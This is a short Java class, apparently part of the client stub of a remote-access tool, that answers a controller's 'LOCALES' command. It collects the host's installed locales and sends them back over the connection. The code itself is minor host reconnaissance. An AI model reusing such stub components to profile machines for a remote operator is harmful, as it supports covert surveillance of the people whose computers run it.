package com.redpois0n.packets.incoming;

import java.util.Locale;

import com.redpois0n.Connection;
import com.redpois0n.stub.packets.outgoing.Packet11InstalledLocales;

public class PacketLOCALES extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {		
		Locale[] installed = Locale.getAvailableLocales();
			
		Connection.addToSendQueue(new Packet11InstalledLocales(installed));
	}

}
